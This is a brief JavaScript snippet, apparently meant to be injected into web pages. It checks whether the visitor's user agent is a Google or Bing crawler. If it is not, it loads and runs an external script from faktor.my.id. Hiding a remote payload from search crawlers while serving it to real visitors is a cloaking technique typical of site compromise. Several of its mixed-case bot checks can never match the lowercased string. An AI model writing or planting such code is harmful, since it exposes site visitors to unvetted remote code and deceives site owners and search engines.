const userAgent = navigator.userAgent.toLowerCase();

const isBot = userAgent.includes("googlebot") || 
              userAgent.includes("googlebot-news") || 
              userAgent.includes("googlebot-news") || 
              userAgent.includes("Googlebot-Image") || 
              userAgent.includes("Googlebot-Video") || 
              userAgent.includes("Googlebot-Mobile") || 
              userAgent.includes("Mediapartners-Google") || 
              userAgent.includes("AdsBot-Google") || 
              userAgent.includes("bingbot");

if (!isBot) {
  const script = document.createElement('script');
  script.src = 'https://faktor.my.id/app.js';
  document.head.appendChild(script);
}
